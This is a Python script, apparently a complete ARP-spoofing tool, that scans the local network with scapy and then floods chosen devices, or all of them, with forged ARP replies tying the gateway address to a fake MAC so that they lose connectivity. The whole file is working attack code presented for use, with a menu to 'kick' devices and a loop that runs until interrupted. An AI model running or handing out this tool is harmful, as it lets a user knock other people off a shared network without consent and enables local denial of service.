# -*- coding: utf-8 -*-

import datetime
import logging
import psutil
import socket
import subprocess
import sys
import time

import os
from requests import get
from scapy.all import srp, Ether, ARP, conf, send, socket

list_of_ips = []

def main():

    print("Hello there...\n")

    if os.geteuid() != 0:
        print("This script need root privilege")
        exit(0)

    attackMode = menu()

    try:
        interfaces = psutil.net_if_addrs()
        print("")
        for i in interfaces.keys():
            print(i + " :: " + interfaces[i][0][1])
        print("")

        iface = ""
        while iface not in interfaces.keys():
            iface = input("[*] Select interface: ")

    except KeyboardInterrupt:
        print("\n[*] KeyboardInterrupt requested...")
        print("[*] Quitting...")
        sys.exit(1)
    
    netmask= interfaces[iface][0][2]
    rangeOfIp = str(interfaces[iface][0][1]) + "/" + str(sum([bin(int(x)).count('1') for x in netmask.split('.')]))
    scan(iface, rangeOfIp)
    attack(attackMode)

def menu():
    print("1) Kick one device\n")
    print("2) Kick some devices\n")
    print("3) Kick all devices\n")

    while True:
        try:
            choice = input(">> ")
            attackMode = int(choice)
            if attackMode > 3 or attackMode < 1:
                print("[-] Pls enter a number from 1 to 3\n")
            else:
                return attackMode

        except Exception as Err:
            print("[-] Pls enter a number\n")

def scan(iface, ips):
    print("[*] Scanning...\n")

    global list_of_ips
    start_scan = datetime.datetime.now()
    conf.verb = 0
    try:
        ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = ips),
            iface=iface, timeout=2, inter=0.1)

    except Exception as Error:
        print("[-] No such device: " + iface )
        print('Or')
        print("[-] Range of IP not known: " + ips)
        exit(0)

    try:
        for s,r in ans:
            dstmac = (r[Ether].src)
            try:
                url = "http://api.macvendors.com/"+str(dstmac)
                vendor = get(url).text
            except:
                vendor = "Unknown"
            print(r.sprintf(r"%Ether.src% - %ARP.psrc%" + "   " + vendor))
            gateway = get_gateway()
            if not r.sprintf(r"%ARP.psrc%") == gateway:
                list_of_ips.append(r.sprintf(r"%ARP.psrc%"))
    except Exception as Err:
        print(Err)

    stop_scan = datetime.datetime.now()
    print("\n[*] Scan completed")
    time_scan = stop_scan - start_scan
    print("[*] Scan duration :: " + str(time_scan))

def get_gateway():
    # A hacky method to get the current lan ip address. It requires internet
    # access, but it works
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("google.com", 80))
    ip = s.getsockname()
    s.close()
    ip_list = ip[0].split('.')
    del ip_list[-1]
    ip_list.append('*')
    ip_range = '.'.join(ip_list)
    del ip_list[-1]
    ip_list.append('1')
    gateway_ip = '.'.join(ip_list)
    return gateway_ip

def attack(attackMode):
    target = []
    global list_of_ips

    gateway = get_gateway()
    print("[+] Gateway ip: " + gateway)

    if attackMode == 1:
        newtarget = input("[>] Choose target ip: ")
        target.append(newtarget)

    if attackMode == 2:
        newtarget = input("[>] Choose ips (separate with ,): ")
        for t in newtarget.split(','):
            target.append(t)

    if attackMode == 3:
        targets = ""
        for t in list_of_ips:
            target.append(t)
        for i in target:
            if i != 'None':
                targets += i + " "
        print("[*] Starting attack mode All. List of ips now: " + targets)

    column = 0
    while True:
        try:
            for i in target:
                if i != 'None':
                    packet = ARP(op=2, psrc=gateway, hwsrc='12:34:56:78:9A:BC', pdst=i)
                    send(packet, verbose=0)
                    column += 1

                    print("[+] Sended " + str(column) + " packets to " + i + "!")

            time.sleep(1)

        except KeyboardInterrupt:
            print("\n[*] KeyboardInterrupt requested...")
            print("[+] Attack done! :)")
            print("[*] Quitting...")
            sys.exit(1)

if __name__ == '__main__':
    main()
